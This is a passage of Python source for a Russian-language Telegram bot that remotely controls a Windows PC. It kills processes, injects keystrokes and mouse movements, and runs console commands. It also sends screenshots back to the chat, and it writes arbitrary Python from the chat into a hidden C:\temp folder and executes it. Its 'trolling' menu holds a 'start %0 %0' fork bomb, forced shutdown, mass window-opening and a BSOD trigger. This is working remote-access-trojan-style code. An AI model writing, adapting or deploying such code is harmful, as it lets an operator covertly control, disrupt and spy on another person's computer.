                fileName = r'C:\temp'
                os.mkdir(fileName)
                kernel32 = ctypes.windll.kernel32
                attr = kernel32.GetFileAttributesW(fileName)
                kernel32.SetFileAttributesW(fileName, attr | 2)

            bot.send_message(message.chat.id, f'☑️ Cписок процессов был *сохранен в файл ниже*!\n\nВведите *ID процесса* для уничтожения или *нажмите на кнопку "Назад"*', parse_mode = "Markdown")
            my_file = open("C:\\temp\\processes.txt", "w", encoding="utf-8")
            my_file.write(processes)
            my_file.close()

            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_document(message.chat.id, document = open('C:\\temp\\processes.txt', 'rb'), reply_markup=markup)
            os.remove('C:\\temp\\processes.txt')
            return bot.register_next_step_handler(message, check_process_list)

def check_process_list(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            return console_menu(message)

        elif message.text.strip() == '/start':
            return start(message)
        
        try:
            int(message.text.strip())
        
        except ValueError:
            return bot.send_message(message.chat.id, '❌ *Произошла ошибка! ID процесса должно быть числом*', parse_mode='Markdown')
        
        kill_id = int(message.text.strip())
        parent = psutil.Process(kill_id)

        try:
            for child in parent.children(recursive=True):
                child.kill()
            
            parent.kill()
        
        except psutil.NoSuchProcess:
            return bot.send_message(message.chat.id, '❌ *Произошла ошибка! Процесса с таким ID не существует*', parse_mode='Markdown')

        except psutil.AccessDenied:
            return bot.send_message(message.chat.id, '❌ *Произошла ошибка! Для уничтожения данного процесса недостаточно прав*', parse_mode='Markdown')
        
        finally:
            bot.send_message(message.chat.id, f'☑️ Процесс с ID *{kill_id}* был успешно уничтожен!', parse_mode = "Markdown")
            return console_menu(message)



def open_site(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            console_menu(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            try:
                whatopen = message.text.strip()
                webbrowser.open(str(whatopen), new=1)

                bot.send_message(message.chat.id, f'☑️ *Вы успешно открыли {whatopen}*', parse_mode='Markdown')
                return console_menu(message)

            except:
                bot.send_message(message.chat.id, '❌ *Произошла ошибка! Попробуйте позже*', parse_mode='Markdown')
                return console_menu()



def media_buttons(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Пауза/Старт")
        item1=types.KeyboardButton("Перемотка вперёд")
        item2=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2)

        bot.send_message(message.chat.id, '⌨️ *Вы в меню медиа-клавиш!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, mediabuttons_check)


def mediabuttons_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Пауза/Старт':
            keyboard.send('play/pause media')
            return media_buttons(message)

        elif message.text.strip() == 'Перемотка вперёд':
            keyboard.send('alt+right')
            return media_buttons(message)

        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return keyboard_menu(message)

        else:
            return media_buttons(message)



def keyboard_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Напечатать что-то")
        item1=types.KeyboardButton("Нажать клавиши")
        item2=types.KeyboardButton("Медиа-клавиши")
        item3=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3)
        
        bot.send_message(message.chat.id, '⌨️ *Вы в меню клавиатуры!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_check)

def keyboard_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            return mainmenu(message)

        elif message.text.strip() == 'Напечатать что-то':
            return keyboard_word(message)

        elif message.text.strip() == 'Нажать клавиши':
            return keyboard_keys(message)

        elif message.text.strip() == 'Медиа-клавиши':
            return media_buttons(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return keyboard_menu(message)



def keyboard_word(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("enter")
        item1=types.KeyboardButton("backspace")
        item2=types.KeyboardButton("space")
        item3=types.KeyboardButton("tab")
        item4=types.KeyboardButton("ctrl+c")
        item5=types.KeyboardButton("ctrl+a")
        item6=types.KeyboardButton("ctrl+v")
        item7=types.KeyboardButton("ctrl+z")
        item8=types.KeyboardButton("ctrl+s")
        item9=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3, item4, item5, item6, item7, item8, item9)
        bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать, или выберите клавиши из списка ниже!\nВписать собственное вы может по примеру ниже:\nalt+f4, enter - нажмется alt+f4 вместе, а только потом enter*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_word2)

def keyboard_word2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == "Назад":
            return keyboard_menu(message)
        
        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == "enter":
            keyboard.press("enter")
            return keyboard_word(message)

        elif message.text.strip() == "backspace":
            keyboard.press("backspace")
            return keyboard_word(message)

        elif message.text.strip() == "space":
            keyboard.press("space")
            return keyboard_word(message)

        elif message.text.strip() == "tab":
            keyboard.press("tab")
            return keyboard_word(message)

        elif message.text.strip() == "ctrl+a":
            keyboard.press("ctrl+a")
            return keyboard_word(message)

        elif message.text.strip() == "ctrl+z":
            keyboard.press("ctrl+z")
            return keyboard_word(message)

        elif message.text.strip() == "ctrl+c":
            keyboard.press("ctrl+c")
            return keyboard_word(message)

        elif message.text.strip() == "ctrl+v":
            keyboard.press("ctrl+v")
            return keyboard_word(message)

        elif message.text.strip() == "ctrl+s":
            keyboard.press("ctrl+s")
            return keyboard_word(message)

        else:
            word = message.text.strip()
            keyboard.write(word, delay=0.25)
            return keyboard_word(message)



def keyboard_keys(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("ctrl+shift+esc")
        item1=types.KeyboardButton("alt+tab")
        item2=types.KeyboardButton("alt+F4")
        item3=types.KeyboardButton("win+e")
        item4=types.KeyboardButton("tab")
        item5=types.KeyboardButton("del")
        item6=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3, item4, item5, item6)
        
        bot.send_message(message.chat.id, '⌨️ *Впишите или выберите ниже то, что хотите выполнить!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, keyboard_keys2)

def keyboard_keys2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == "Назад":
                return keyboard_menu(message)

            elif message.text.strip() == '/start':
                return start(message)

            else:
                word = message.text.strip()
                keyboard.send(word)
                return keyboard_keys(message)
        
        except ValueError:
            bot.send_message(message.chat.id, '❌ *Одна или несколько из клавиш не была найдена! Повторите попытку*', parse_mode='Markdown')
            return keyboard_keys(message)



def samp_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Подключение к SAMP серверу")
        item1=types.KeyboardButton("Подключение к RakLaunch Lite")   
        item2=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2)

        bot.send_message(message.chat.id, '*😇 Вы в меню SAMP!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, samp_check)

def samp_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        cmd = message.text.strip()

        if cmd == "Назад":
            return mainmenu(message)

        elif cmd == "/start":
            return start(message)

        elif message.text.strip() == 'Подключение к SAMP серверу':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '✍️ *Введите IP сервера, на который вы хотите зайти!\n\nP.s. будет использоваться ник, под которым вы играли в последний раз!*', parse_mode='Markdown', reply_markup=markup)
            return bot.register_next_step_handler(message, samp_connect)

        elif message.text.strip() == 'Подключение к RakLaunch Lite':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '✍️ *Введите информацию по форме ниже:\nnickname,ip,port\nПример: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown', reply_markup=markup)
            return bot.register_next_step_handler(message, raklite_connect)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return samp_menu(message)



def mainmenu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("/start")
        item1=types.KeyboardButton("Консоль")
        item2=types.KeyboardButton("Настройки ПК")
        item3=types.KeyboardButton("Файлы и папки")
        item4=types.KeyboardButton("Клавиши")
        item5=types.KeyboardButton("Троллинг")
        item6=types.KeyboardButton("SAMP функции")
        item7=types.KeyboardButton("Меню биндов")
        item8=types.KeyboardButton("Особые функции")
        markup.add(item0, item1, item2, item3, item4, item5, item6, item7, item8)
        
        bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_main)

def check_main(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Файлы и папки':
            return files(message)

        elif message.text.strip() == 'Консоль':
            return console_menu(message)

        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Клавиши':
            return keyboard_menu(message)

        elif message.text.strip() == 'Меню биндов':
            return bind_menu(message)
        
        elif message.text.strip() == 'Троллинг':
            return packs(message)

        elif message.text.strip() == 'Особые функции':
            return other_functions(message)

        elif message.text.strip() == 'SAMP функции':
            return samp_menu(message)

        elif message.text.strip() == 'Настройки ПК':
            return pc_settings(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return mainmenu(message)



def other_functions(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Удаление папки со скриптом")
        item1=types.KeyboardButton("Выход из скрипта")
        item2=types.KeyboardButton("Вызывать BSOD")
        item3=types.KeyboardButton("Выход из учетной записи")
        item4=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3, item4)
        bot.send_message(message.chat.id, '🔑 *Выберите нужную функцию!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_other)


def check_other(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Удаление папки со скриптом':
            return full_delete(message)

        elif message.text.strip() == 'Выход из скрипта':
            return script_exit(message)

        elif message.text.strip() == 'Назад':
            return mainmenu(message)

        elif message.text.strip() == 'Выход из учетной записи':
            return logout(message)

        elif message.text.strip() == 'Вызывать BSOD':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Да, конечно")
            item1=types.KeyboardButton("Нет, я передумал")
            markup.add(item0, item1)
            bot.send_message(message.chat.id, '❌ *Вы уверены, что хотите вызвать BSOD?*', parse_mode='Markdown', reply_markup=markup)
            return bot.register_next_step_handler(message, bsod)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return other_functions(message)

def logout(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Да, подтверждаю")
        item1=types.KeyboardButton("Нет, я передумал")
        markup.add(item0, item1)

        bot.send_message(message.chat.id, '😢 *Подтвердите выход из учетной записи!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_logout)

def check_logout(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Да, подтверждаю':
            bot.send_message(message.chat.id, '☑️ *Вы успешно вышли из учетной записи*', parse_mode='Markdown')
            return subprocess.run('shutdown /l')

        elif message.text.strip() == 'Нет, я передумал':
            bot.send_message(message.chat.id, '🎉 *Вы отменили выход из учетной записи!*', parse_mode='Markdown')
            return other_functions(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '🎉 *Вы отменили выход из учетной записи!*', parse_mode='Markdown')
            return other_functions(message)



def script_exit(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Да, подтверждаю")
        item1=types.KeyboardButton("Нет, я передумал")
        markup.add(item0, item1)

        bot.send_message(message.chat.id, '😢 *Подтвердите выключение скрипта!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_exit)

def check_exit(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Да, подтверждаю':
            bot.send_message(message.chat.id, '😥 *Вы завершили работу скрипта!*', parse_mode='Markdown')
            return os.abort()

        elif message.text.strip() == 'Нет, я передумал':
            bot.send_message(message.chat.id, '🎉 *Вы отменили завершение работы скрипта!*', parse_mode='Markdown')
            return other_functions(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '🎉 *Вы отменили завершение работы скрипта!*', parse_mode='Markdown')
            return other_functions(message)


def packs(message):
    get_chat_id = message.chat.id
    
    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Выключение ПК")
        item1=types.KeyboardButton("Массовое открытие сайтов")
        item2=types.KeyboardButton("Массовое открытие проводника")
        item3=types.KeyboardButton("Массовое перемещение мышки")
        item4=types.KeyboardButton("start %0 %0")
        item5=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3, item4, item5)

        bot.send_message(message.chat.id, '👺 *Вы в меню троллинга!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_packs)

def check_packs(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Выключение ПК':
            bot.send_message(message.chat.id, '☑️ *Вы успешно использовали функцию выключения ПК!*', parse_mode='Markdown')
            subprocess.Popen('shutdown /s /t 0', shell=True)
            return packs(message)

        elif message.text.strip() == '/start':
            return start(message)
        
        elif message.text.strip() == 'Назад':
            return mainmenu(message)

        elif message.text.strip() == 'start %0 %0':
            my_file = open("troll.bat", "w", encoding="utf-8")
            my_file.write('start %0 %0')
            my_file.close()

            os.startfile("troll.bat")
            bot.send_message(message.chat.id, '☑️ *Start %0 %0 успешно запущен!*', parse_mode='Markdown')
            return packs(message)

        elif message.text.strip() == 'Массовое открытие сайтов':
            bot.send_message(message.chat.id, '✍️ *Введите сколько раз вы хотите открыть сайты!*', parse_mode='Markdown')
            return bot.register_next_step_handler(message, troll_site)

        elif message.text.strip() == 'Массовое открытие проводника':
            bot.send_message(message.chat.id, '✍️ *Введите сколько раз вы хотите открыть проводник!*', parse_mode='Markdown')
            return bot.register_next_step_handler(message, troll_provod)

        elif message.text.strip() == 'Массовое перемещение мышки':
            bot.send_message(message.chat.id, '✍️ *Введите сколько секунд вы хотите перемещать мышь!*', parse_mode='Markdown')
            return bot.register_next_step_handler(message, mouse_troll)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return packs(message)



def mouse_troll(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xmouse = message.text.strip()

        if str(xmouse) == "/start":
            return start(message)

        try:
            int(xmouse)
        
        except ValueError:
            bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
            return packs(message)

        else:
            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xmouse} секунд!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xmouse)):
                pyautogui.moveTo(147, 154, duration=0.10)
                pyautogui.moveTo(325, 635, duration=0.10)
                pyautogui.moveTo(500, 489, duration=0.10)
                pyautogui.moveTo(1299, 963, duration=0.10)
                pyautogui.moveTo(327, 655, duration=0.10)
                pyautogui.moveTo(798, 655, duration=0.10)
                pyautogui.moveTo(25, 752, duration=0.10)
                pyautogui.moveTo(1058, 162, duration=0.10)
                pyautogui.moveTo(1263, 825, duration=0.10)
                pyautogui.moveTo(558, 265, duration=0.10)

            else:
                return bot.send_message(message.chat.id, '☑️ *Скрипт на перемещение мышки успешно выполнился!*', parse_mode='Markdown')



def troll_provod(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xprovod = message.text.strip()

        if str(xprovod) == "/start":
            return start(message)

        try:
            int(xprovod)
        
        except ValueError:
            bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
            return packs(message)

        else:
            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xprovod} раз!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xprovod)):
                return keyboard.send("win+e")

            else:
                return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие проводника успешно выполнился!*', parse_mode='Markdown')



def troll_site(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        xsite = message.text.strip()

        if str(xsite) == "/start":
            return start(message)

        try:
            int(xsite)
        
        except ValueError:
            bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
            return packs(message)

        else:
            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xsite} раз!*', parse_mode='Markdown')
            packs(message)

            for i in range(int(xsite)):
                webbrowser.open('https://dzen.ru', new = 1)
                webbrowser.open('https://youtube.com', new = 1)
                webbrowser.open('https://www.google.com', new = 1)
                webbrowser.open('https://yandex.ru', new = 1)
                webbrowser.open('https://edu.gounn.ru', new = 1)
                            
            else:
                return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие сайтов успешно выполнился!*', parse_mode='Markdown')


def full_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        bot.send_message(message.chat.id, f"import shutil\n\nshutil.rmtree('{os.path.abspath(os.curdir)}')")
        return bot.register_next_step_handler(message, full_delete_open)

def full_delete_open(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if os.path.exists('C:\\temp') == False:
            fileName = r'C:\temp'
            os.mkdir(fileName)
            kernel32 = ctypes.windll.kernel32
            attr = kernel32.GetFileAttributesW(fileName)
            kernel32.SetFileAttributesW(fileName, attr | 2)

        if str(message.text.strip()) == "/start":
            return start(message)

        else:
            my_file = open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8")
            my_file.write(str(message.text.strip()))
            my_file.close()

            subprocess.Popen("python C:\\temp\\DeleteFile.py", shell=True)
            return other_functions(message)


def pc_settings(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Изменить яркость")
        item1=types.KeyboardButton("Назад")
        markup.add(item0, item1)

        bot.send_message(message.chat.id, '🔧 *Вы в меню настроек ПК!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, pc_settings_check)

def pc_settings_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            return mainmenu(message)
        
        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Изменить яркость':
            return brightness_set(message) 

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return pc_settings(message)

def brightness_set(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '🔧 *Введите уровень яркости(1-100)!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_brightness_set)

def check_brightness_set(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        level = message.text.strip()

        if level  == 'Назад':
            return pc_settings(message)

        elif level == '/start':
            return start(message)

        try:
            int(level)
        
        except ValueError:
            bot.send_message(message.chat.id, f'❌ *Уровень должен быть числом!*', parse_mode='Markdown')
            return pc_settings(message)

        if int(level) < 1 or int(level) > 100:
            return bot.send_message(message.chat.id, f'❌ *Уровень должен быть больше 1 и меньше 100!*', parse_mode='Markdown')
        
        sbc.set_brightness(int(level))
        bot.send_message(message.chat.id, f'❌ *Вы успешно установили уровень яркости {level}!*', parse_mode='Markdown')
        return pc_settings(message)

#Бинд API
class bindAPI:
    def setWait(dur):
        try:
            return time.sleep(int(dur))

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setWait, время = {dur}*", parse_mode='Markdown')

    def setCursor(x, y):
        try:
            return pyautogui.moveTo(int(x), int(y))

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setCursor, x = {x}, y = {y}*", parse_mode='Markdown')

    def writeKeyboard(text):
        try:
            return keyboard.write(text, 0)

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция writeKeyboard, текст = {text}*", parse_mode='Markdown')

    def useKeyboard(combo):
        try:
            return keyboard.send(combo)

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useKeyboard, комбинация = {combo}*", parse_mode='Markdown')

    def useConsole(cmd, sendResult, sendId):
        try:
            if int(sendResult) >= 1:
                output=subprocess.getoutput(cmd, encoding='cp866')
                return bot.send_message(sendId, output)
                
            else:
                return subprocess.Popen(cmd, shell=True)

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useConsole, команда = {cmd}, sendResult = {sendResult}, sendId = {sendId}*", parse_mode='Markdown')

    def openSite(site):
        try:
            return webbrowser.open(site)

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openSite, сайт = {site}*", parse_mode='Markdown')

    def sendScreenshot(sendId):
        try:
            pyautogui.screenshot("screen.png")
            return bot.send_document(int(sendId), open("screen.png", 'rb'))

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция sendScreenshot, sendId = {sendId}*", parse_mode='Markdown')

    def sendMessage(sendId, text):
        try:
            return bot.send_message(int(sendId), text)

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция sendMessage, sendId = {sendId}, текст - {text}*", parse_mode='Markdown')

    def openProgram(path):
        try:
            return subprocess.Popen(f"start {path}")

        except FileNotFoundError:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openProgram, path = {path}*, файл не был найден", parse_mode='Markdown')

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openProgram, path = {path}*", parse_mode='Markdown')

    def clickMouse(button):
        try:
            if button == 'r':
                return pyautogui.click(button='right')

            elif button == 'l':
                return pyautogui.click()

            else:
                error = 1
                return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда: неизвестная кнопка! Доступные варианты - r или l\n*Функция clickMouse, button = {button}*", parse_mode='Markdown')

        except:
            error = 1
            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция clickMouse, button = {button}*", parse_mode='Markdown')


def bind_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Использовать бинд")
        item1=types.KeyboardButton("Удалить бинд")
        item2=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2)

        bot.send_message(message.chat.id, '😏 *Вы в меню использования биндов!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_bind_menu)

def check_bind_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        cmd = message.text.strip()

        if cmd == '/start' or cmd == 'Назад':
            return mainmenu(message)

        elif cmd == 'Удалить бинд':
            return bind_delete(message)

        elif cmd == 'Использовать бинд':
            return choose_bind(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return bind_menu(message)



def bind_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '😏 *Вы в меню удаления биндов!\nВведите имя уже существующего бинда для его удаления*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_bind_del)

def check_bind_del(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip == "/start":
            return start(message)

        elif message.text.strip == "Назад":
            return bind_menu(message)

        #////////////////////

        if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
            bot.send_message(message.chat.id, f'🤨 *Удаляю {message.text.strip()}.txt!*', parse_mode='Markdown')
            os.remove(f"binds\\{message.text.strip()}.txt")
            return bind_menu(message)
        
        else:
            bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
            return bind_menu(message)

def choose_bind(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '😏 *Вы в меню взаимодействия с биндами!\nВведите имя уже существующего бинда для его открытия*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, bind_read)


def bind_read(message):
    global error
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip == "/start":
            return start(message)

        elif message.text.strip == "Назад":
            return bind_menu(message)

        if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
            bind_menu(message)
            bot.send_message(message.chat.id, f'🤨 *Запускаю {message.text.strip()}.txt!*', parse_mode='Markdown')
        
        else:
            bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
            return bind_menu(message)

        file = open(f"binds\\{message.text.strip()}.txt", "r", encoding='utf8')
        text = file.read()
        code = text.split("\n")

        for i in code:
            if error == 1:
                return

            try:
                if i.startswith('//'):
                    continue

                elif i.startswith('wait'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.setWait(int(info[1]))

                elif i.startswith('setCursor'):
                    info = i.split('=', maxsplit=1)
                    funcCode = info[1].split(',', maxsplit=1)
                    bindAPI.setCursor(int(funcCode[0]), int(funcCode[1]))

                elif i.startswith('writeKeyboard'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.writeKeyboard(info[1])

                elif i.startswith('useKeyboard'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.useKeyboard(info[1])

                elif i.startswith('useConsole'):
                    info = i.split('=', maxsplit=1)
                    funcCode = info[1].split(',', maxsplit=2)
